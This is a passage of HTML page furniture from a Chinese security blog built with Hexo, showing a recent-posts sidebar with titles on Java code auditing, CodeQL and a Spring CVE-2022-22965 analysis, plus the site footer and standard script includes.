class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/" title="Java代码审计： ClassLoader应用"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java代码审计： ClassLoader应用"/></a><div class="content"><a class="title" href="/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/" title="Java代码审计： ClassLoader应用">Java代码审计： ClassLoader应用</a><time datetime="2022-05-10T08:21:21.000Z" title="发表于 2022-05-10 16:21:21">2022-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="CodeQL基础语法"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CodeQL基础语法"/></a><div class="content"><a class="title" href="/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="CodeQL基础语法">CodeQL基础语法</a><time datetime="2022-04-22T04:01:39.000Z" title="发表于 2022-04-22 12:01:39">2022-04-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/" title="Spring Rce 漏洞分析CVE-2022-22965"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring Rce 漏洞分析CVE-2022-22965"/></a><div class="content"><a class="title" href="/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/" title="Spring Rce 漏洞分析CVE-2022-22965">Spring Rce 漏洞分析CVE-2022-22965</a><time datetime="2022-04-07T15:20:11.000Z" title="发表于 2022-04-07 23:20:11">2022-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/" title="转载：Gitee 图床 外链问题 处理"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="转载：Gitee 图床 外链问题 处理"/></a><div class="content"><a class="title" href="/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/" title="转载：Gitee 图床 外链问题 处理">转载：Gitee 图床 外链问题 处理</a><time datetime="2022-03-27T10:27:24.000Z" title="发表于 2022-03-27 18:27:24">2022-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Codeql 环境手模手搭建和简单使用"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Codeql 环境手模手搭建和简单使用"/></a><div class="content"><a class="title" href="/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Codeql 环境手模手搭建和简单使用">Codeql 环境手模手搭建和简单使用</a><time datetime="2022-03-14T04:26:04.000Z" title="发表于 2022-03-14 12:26:04">2022-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Zeo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
